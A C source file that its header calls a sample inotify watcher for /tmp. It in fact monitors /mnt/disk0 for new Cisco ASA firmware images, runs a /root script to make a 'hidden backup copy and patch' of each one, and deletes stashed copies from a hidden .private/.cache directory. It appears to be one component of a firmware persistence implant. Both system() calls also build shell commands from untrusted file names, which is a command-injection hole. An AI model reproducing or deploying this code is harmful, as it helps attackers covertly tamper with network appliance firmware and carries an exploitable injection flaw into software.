/*This is the sample program to notify us for the file creation and file deletion takes place in “/tmp” directory*/
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <linux/inotify.h>
#include <sys/stat.h>
#include <linux/limits.h>
#include <unistd.h>
#include <string.h>


#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )
#ifndef BUF_SIZE
#define BUF_SIZE 1024
#endif


char* firmware_dir = "/mnt/disk0/";
struct stat st;
char hidden_img_path[PATH_MAX];
char original_img_path[PATH_MAX];




int check_filename(char* firmware_filename){
        //Check if the file in /mnt/disk0 begins with a and ends with .bin ???
    int i=0;
        char* pos;
        int is_asa_bin=0;
        pos = strstr(firmware_filename, "asa");
        i = pos - firmware_filename;
        if(i == 0){
                pos = strstr(firmware_filename, ".bin");
                i = strnlen(firmware_filename,256) - (pos - firmware_filename);
                if(i==4){
                        is_asa_bin =1;
					//	 printf( "[x] Confirmed %s is in ASA image filename format\n",firmware_filename );
				}
        }
    return is_asa_bin;
}




int main(int argc, char *argv[] )
{
 /* Start monitoring the firmware directory (default /mnt/disk0/) for write() changes..  catch a new firmware update!*/

  int length, i = 0;
  int fd;
  int wd;
  char buffer[EVENT_BUF_LEN];
  char fnbuffer[150];
  char *p;
  char *the;
  struct inotify_event *event;


for (;;){
  fd = inotify_init();
    if ( fd < 0 ) {
    perror( "inotify_init" );
  }
  wd = inotify_add_watch( fd, firmware_dir, IN_CLOSE_WRITE|IN_DELETE|IN_MOVED_TO);

  length = read( fd, buffer, EVENT_BUF_LEN);
  /*checking for error*/
  if ( length < 0 ) {
    perror( "ERROR: read" );
  }
  for (p = buffer; p < buffer + length; ) {
                event = (struct inotify_event *) p;

                /* Is it an ASA firmware image file name asaXXXX.bin ? */
                if(check_filename(event->name)==1){
                        if ((event->mask & IN_CLOSE_WRITE) || (event->mask & IN_MOVED_TO)){
                                //New firmware image detected... Create a hidden backup copy and patch!
                                printf( "\n[*] New firmware file upload detected: %s\n", event->name );
								snprintf(fnbuffer, sizeof(fnbuffer), "/root/M4R10-download.sh %s", event->name);
								system(fnbuffer);
                        }
                        if (event->mask & IN_DELETE){
                                printf( "[*] Delete request detected: %s\n", event->name );
								snprintf(fnbuffer, sizeof(fnbuffer), "rm /mnt/disk0/.private/.cache/%s", event->name);
								system(fnbuffer);
                        }
                }
                p += sizeof(struct inotify_event) + event->len;

                }
        }
        printf("Leaving...\n");
        inotify_rm_watch( fd, wd );
        close(fd);
}
